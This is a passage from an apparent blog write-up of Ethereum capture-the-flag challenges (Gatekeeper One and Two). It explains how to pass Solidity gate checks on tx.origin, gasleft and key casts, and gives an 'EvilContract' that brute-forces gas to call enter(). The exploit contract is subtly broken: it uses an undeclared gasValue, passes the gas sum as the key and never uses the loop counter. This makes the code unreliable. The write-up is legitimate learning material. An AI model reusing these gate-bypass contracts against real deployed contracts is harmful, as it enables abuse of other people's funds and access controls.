contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">unlock</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Returned_Value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="gatekeeper one">Gatekeeper One</h2>
<p class="chakra-text css-0" node="[object Object]">This challenge gave me hard time, two days to solve it but I learnt a lot during those days.</p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">Make it past the gatekeeper and register as an entrant to pass this level.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">Okay so we got three modifiers, each one represents a <code class="inline-code">barrier</code> we need to break through. I will be going through each modifier one by one.</p>
<style data-emotion="css 6gwv5m">.css-6gwv5m{font-family:var(--chakra-fonts-heading);font-weight:700;font-size:36px;line-height:1.33;margin-bottom:var(--chakra-space-3);margin-top:var(--chakra-space-6);}@media screen and (min-width: 48em){.css-6gwv5m{line-height:1.2;}}</style><h4 class="chakra-heading css-6gwv5m" id="gateone">gateOne</h4>
<p class="chakra-text css-0" node="[object Object]">Looking to this gate it sounds really familiar</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e_eyyyd2.png" alt="GatekeeperOne gateOne" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">GatekeeperOne gateOne</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">It implies that we should be using another contract to interact with the gate.</p>
<h4 class="chakra-heading css-6gwv5m" id="gatethree">gateThree</h4>
<p class="chakra-text css-0" node="[object Object]">I will leave gateTwo the last one as it&#x27;s the most annoying ( not hard ) one to pass.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a_bg3gdk.png" alt="GatekeeperOne gateOne" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">GatekeeperOne gateOne</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">We got three conditions to pass and lot of type conversion 🙂.It&#x27;s time we learn how conversions works in solidity <a class="chakra-link css-9olwc6" href="https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions">Solidity Type conversions</a></p>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s go through each condition one by one</p>
<ol>
<li>First condition</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">uint16</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have</p>
<p class="chakra-text css-0" node="[object Object]"><em>uint16 == uint32</em> which translates to 0x0000AAAA== 0xAAAA. =&gt; uint64(_gateKey) = 0x????????0000AAAA</p>
<ol start="2">
<li>Second Condition</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the <code class="inline-code">?</code> are different than zeros.</p>
<ol start="3">
<li>Last condition</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">uint16</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">It just tells us that the <code class="inline-code">AAAAA</code> should be derived from the <code class="inline-code">tx.origin</code> value.</p>
<p class="chakra-text css-0" node="[object Object]">Okay to sum it up we have the format of <code class="inline-code">0xFFFFFFFF0000FFFF</code> for our contract. so we can get the values by using a logical operator <code class="inline-code">&amp;</code>.</p>
<h4 class="chakra-heading css-6gwv5m" id="gatetwo">gateTwo</h4>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf_f9rwex.png" alt="Gateekeeper gateTwo" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Gateekeeper gateTwo</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">what is the <code class="inline-code">gasleft</code> function ?
the gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?
we can check the website <a class="chakra-link css-9olwc6" href="https://www.ethervm.io/">Opcodes, EVM</a>, actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<ol>
<li>We should call the contract from our <code class="inline-code">Evil Contract</code> so we bypass the first gate</li>
<li>We should make sure the key adhere to the key format we found.</li>
<li>We need to pass a gas value that passes the condition.<!-- -->
<blockquote>
<p class="chakra-text css-0" node="[object Object]">However when searching for that gas value we can
1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)
2. Use the debugger to check the gas value at the condition check.
3. Just don&#x27;t, if you are impatient brute force it. That&#x27;s what I did when I got low on caffeine and the music stopped.</p>
</blockquote>
</li>
</ol>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/18f23b5aad25da24fa6fbdc8842fb1ee0568daa3ac723a166802b0cc2dd2518d_yg3ech.png" alt="Debugging interface" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Debugging interface</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So here is the final contract</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getKey</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> view </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes8</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&amp;</span><span> </span><span class="token" style="color:#b5cea8">0xFFFFFFFF0000FFFF</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// The first time will pass false the second true</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">callAttack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address gateAddress</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> uint baseGasValue</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>        bytes8 gateKey </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">getKey</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>        uint i</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>        </span><span class="token" style="color:#c586c0">for</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>i</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>i</span><span class="token" style="color:#d4d4d4">&lt;</span><span class="token" style="color:#b5cea8">300</span><span class="token" style="color:#d4d4d4">;</span><span>i</span><span class="token" style="color:#d4d4d4">++</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>        </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>        </span><span class="token" style="color:#d4d4d4">(</span><span>bool result</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span>  gateAddress</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">call</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">gas</span><span class="token" style="color:#d4d4d4">:</span><span>gasValue</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;enter(bytes8)&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> baseGasValue</span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#b5cea8">8191</span><span class="token" style="color:#d4d4d4">*</span><span class="token" style="color:#b5cea8">4</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>        </span><span class="token" style="color:#c586c0">if</span><span class="token" style="color:#d4d4d4">(</span><span>result</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> result</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Happy hacking ! You may rest traveler , The next gate will be some kind of a boss fight.</p>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="gatekeeper two">GateKeeper Two</h2>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">Time to delve deep in the ethereum blockchain</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">I will sum up we need to pass the gate and learn many things.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">As usual here we got three modifiers to pass. We will be going through each modifer one by one from the easiest to the hardest.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/193982e4a19ec767e0759ab2e9adc2e16865502b0625e6eb22fc0a39e11418d7_k0ahq6.png" alt="Gatekeeper contract" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Gatekeeper contract</p></div></div></p>
<h4 class="chakra-heading css-6gwv5m" id="gateone">GateOne</h4>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>modifier </span><span class="token" style="color:#dcdcaa">gateOne</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    _</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Okay we need to call the <code class="inline-code">GatekeeperTwo</code> from another contract.</p>
<h4 class="chakra-heading css-6gwv5m" id="gatetwo">GateTwo</h4>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>modifier </span><span class="token" style="color:#dcdcaa">gateTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    uint x</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    assembly </span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token literal-property" style="color:#9cdcfe">x</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">extcodesize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">caller</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>x </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    _</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Oww a new keyword <code class="inline-code">assembly</code> what&#x27;s that ?
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/2cb6f44375d3fb1a39d4e147414218e8f9d1b7fe5a98c873c4469082b7fba674_qlucds.png" alt="Solidity Documentation Screenshot - assembly keyword" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Solidity Documentation Screenshot - assembly keyword</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So we have now a clear idea of the assembly keyowrd and it&#x27;s capabilities, that might remind you a little bit of how the <code class="inline-code">C</code> language works !
For the <code class="inline-code">extcodesize</code> the code snippet below taken from the docs explains it all.</p>
